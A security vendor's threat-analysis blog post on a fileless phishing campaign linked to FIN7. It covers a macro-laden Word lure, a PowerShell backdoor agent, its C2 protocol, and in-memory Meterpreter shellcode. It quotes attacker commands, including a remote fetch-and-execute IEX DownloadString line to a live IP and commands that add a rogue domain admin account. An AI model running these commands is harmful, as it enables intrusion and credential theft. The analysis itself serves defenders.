@@ -1,0 +1,122 @@
+
+Morphisec Discovers New Fileless Attack Framework
+
+Posted by
+Michael Gorelik on March 16, 2017 at 1:55 PM
+                           
+
+Find me on:
+
+LinkedIn
+Twitter 
+
+
+
+
+
+Ties Single Threat Actor Group to Multiple Campaigns, Interacts with Hacker.
+On the 8th of March, Morphisec researchers began investigating a new fileless threat delivered via a macro-enabled Word document, which was attached to a phishing email sent to targeted high-profile enterprises. During the course of the investigation, we uncovered a sophisticated fileless attack framework that appears to be connected to various recent, much discussed attack campaigns.
+The threat actor group behind this attack is likely the same one that carried out the DNS PowerShell messenger attack discovered by Talos on March 3rd. Investigation of the Command and Control center revealed resources that pointed to script artifacts on the C2 server closely resembling those from the DNS PowerShell messenger attack. Additional scripts and artifacts were found that can be traced to the Meterpreter attack discovered by Kaspersky and the campaign reported by FireEye which targeted personnel involved in SEC filings.  FireEye believes that attack to be tied to a threat group they dubbed FIN7.
+!
+Based on our findings, a single group of threat actors is responsible for many of the most sophisticated attacks on financial institutions, government organizations and enterprises over the past few months.
+Just who these actors are still remains unknown. During the research, for a brief moment, the attacker interacted with our researchers via the very same PowerShell protocol used for the attack delivery. This rare interaction made clear that the hacker is part of a group which limits their exposure by targeting specific companies only. The threat actors blocked one of the IPs we were using for our investigation and soon after completely shut down that C2 command and control server. Potentially, this resulted in the attackers losing their foothold in the systems of victims connected to that server and stopping ongoing chains of attack.
+Morphisec routinely tests it Endpoint Threat Solution against new attacks, particularly sophisticated attacks marked by low detection rates. While investigating such an attack, we not only observed several variations of the attack on different targets, but also discovered a complete attack framework which, we believe, was used to deliver several severe attacks that targeted banks, enterprises and governmental organizations.
+Initial infection begins when the weaponized Word document delivers a PowerShell agent that opens a backdoor and establishes persistency. After this point, in most cases, the rest of the PowerShell commands are delivered through the command server. Over the course of three days, we observed different commands delivered based on the type of the target. For some targets, the attack was fully fileless, eventually delivering a Meterpreter session directly to memory. In other cases, the password-stealer LaZagne Project or another Python executable was delivered and executed.
+After additional investigation, we identified controllers for different protocols including Cmd, Lazagne, Mimikatz and more.
+Below are the indicators for the malicious document file. The detection ratio is just below the radar for most AVs. The document received a very low AV multiscan detection score of 16%, indicating a high level of sophistication.
+
+Note the very low score in VirusTotal; none of the significant AV solutions identify this document statically as malicious. 
+By all accounts, fileless attacks are on the rise and the problem may be bigger than anyone realizes. The malware resides solely in memory and commands are delivered directly from the Internet, with no executables on disk, making it basically invisible.
+Last month, Kaspersky Lab found that networks of 140 banks, government organizations and enterprises were infected with fileless malware and suggests that the number could be much higher. AV solutions and Next Gen solutions, including AI-based technology, cannot cope with these fileless memory-based attacks. Knowing this, cybercriminal groups have increased their focus on these types of attacks: tools are widely available and encrypting the attack to evade security solutions is actually the easy part.
+Here we see a single threat actor group, with tools easily available from the wide web, inflicting enormous damage. Given that the number of such actors will only increase, the need for a memory-based prevention solution like Morphisec Endpoint Threat Prevention is critical to any organization.
+Read online or download the Attack Anlysis PDF. 
+As previously mentioned, the infection begins via a malicious Word document attached to a phishing email. The document claims to be protected and that the victim needs to enable the content to view it. This of course enables the macro.
+ 
+At this point, PowerShell executes using Windows Management Instrumentation (WMI), which has long been used for AV evasion.
+ 
+To keep suspicion low, an error windows pops up claiming that the document couldn’t open because of a missing file.
+ 
+After several decryption stages, the decrypted PowerShell is saved in Public/Documents and named Updater.ps1.
+
+[Full script at: http://pastebin.com/aswBvyZC ]
+This script is actually an agent which gets commands from the C2 server, executes them and returns the results. The malware also lowers the security macro restrictions in Office by disabling the protected view - HKCU:\Software\Microsoft\Office\$i.0\excel\Security\ProtectedView. This allows future macro-based documents to be automatically executed, without any “enable macro” pop-up.
+Morphisec identified the C2 server and, after further investigations, found additional scripts that execute Mimikatz, Lazagne, Cmd, DNS messenger (for more details see the Command & Control section below).
+ 
+
+This specific version adds the execution of the PowerShell through Visual basic code in the HKCU Run key and stores the triggered visual basic file and PowerShell script in the Public/Documents folder.
+We found other versions of Updater.ps1, ready to be deployed and turn more companies into victims of this cybercrime. Those versions also add a scheduled task to execute the PowerShell, in case it is executed with admin privileges.
+
+As mentioned before, the same PowerShell script (Updater.ps1) -  which is also executed upon restart - includes a detailed protocol for contacting the server:
+Register
+/v2/?action=register&data=<base64>
+Send Results
+/v2/?action=saveResult&id=<registered key>&cmd=<Get Command Id>&res=<base64>
+Get Command
+/v2/?action=getCommand&id=<registered key>
+ 
+ 
+The first register operation creates a key file in the Public/Documents directory which will persist the registered number across boots. This allows the attacker to automatically identify and track the victim.
+The following table lists the typical commands sent before executing the next stage PowerShell shellcode (Meterpreter).
+net user
+net group "domain admins"  iis_server_service /add /domain
+net group /domain | findstr enterprise
+net group "enterprise admins"  iis_server_service /add /domain
+net share
+ipconfig /all
+PowerShell command (more details below)
+In the previously mentioned instances, the set of commands is much more limited and eventually delivers an executable. The PowerShell downloads a Python compiled executable based on the popular, open-source LaZagne application, which steals credentials from the user.
+ 
+Limited set of commands:
+net user
+Whoami
+ipconfig /all
+IEX (New-Object Net.WebClient).DownloadString("http://138.201.75.227/mo/la.ps1")
+Investigating the server further, we found many open ports. Additional observation on the server led us to identify the following structures:
+ 
+ We also found and downloaded a set of malicious files, some of them well-known and used for Mimikatz attacks, others are PowerShell exploitations and User Account Control (UAC ) exploitations.
+In the course of our research the attacker briefly interacted with us. It was clear that a person from the other side was waiting to connect on his Meterpreter session.
+During the brief interaction, our researchers tried to identify the actor. The attackers immediately blocked the connection and later shut down the C2 server entirely, thereby losing their foothold in the systems of victims connected to that communication server.
+Back to our fileless attack, the last command delivered back to the PowerShell process is of course encrypted. We discovered that the decrypted script has many similarities to samples identified by Kaspersky on their blog in early February. According to Kaspersky this threat infected more than 140 enterprises, banks and government organizations around the world.
+After several decryption stages, we received the command:
+
+After more decryption, we identified the following script that injects Meterpreter directly to memory and then executes a new thread pointing to the shellcode:
+
+[ Full script at http://pastebin.com/hdikfzhV]
+The shellcode has two stages; the first one is responsible for reading the next stage directly from the Internet.
+Shellcode Stage 1:
+
+The core functions used during this shellcode are:
+1
+Kernel32!LoadLibraryA
+2
+Wininet!InternetOpenA
+3
+Wininet!InternetConnectA (138.201.75.227,4432)
+4
+Wininet!HttpOpenRequestA(ConnectionHandle,Secret embedded inside the shellcode,…)
+5
+Wininet!InternetSetOptionA
+6
+Wininet!HttpSendRequestA
+7
+Kernel32!VirtualAlloc
+8
+Wininet!InternetReadFile
+Shellcode Stage 2:
+The second stage is the Meterpreter, delivered directly in-memory from 138.201.75.227:4432 (using InternetReadFile function). The shellcode starts from the MZ file header, is directly executed within the header and later modified to a normal MZ.
+
+
+Later in our investigation, the same command server also delivered a variant of the DNS messenger similar to that described by Talos. The domain names differed but the script adheres to the same logic (including the logic function).
+The encrypted and obfuscated version:
+
+[See: http://pastebin.com/NhvRyYtQ]
+The decrypted DNS messenger:
+ 
+ 
+By all accounts, fileless attacks are on the rise and the problem may be bigger than anyone realizes. The malware resides solely in memory and commands are delivered directly from the Internet, with no executables on disk, making it basically invisible.
+Last month, Kaspersky Lab found that networks of 140 banks, government organizations and enterprises were infected with fileless malware and suggests that the number could be much higher. AV solutions and Next Gen solutions, including AI-based technology, cannot cope with these fileless memory-based attacks. Knowing this, cybercriminal groups have increased their focus on these types of attacks: tools are widely available and encrypting the attack to evade security solutions is actually the easy part.
+Here we see a single threat actor group, with tools easily available from the wide web, inflicting enormous damage. Given that the number of such actors will only increase, the need for a memory-based prevention solution like Morphisec Endpoint Threat Prevention is critical to any organization.
+This reseach is also available for download in PDF. 
+ 
+ hbspt.cta.load(1534169, '38aeb02a-bc63-4a36-914f-3f88f859f8c6', {}); 
+ 
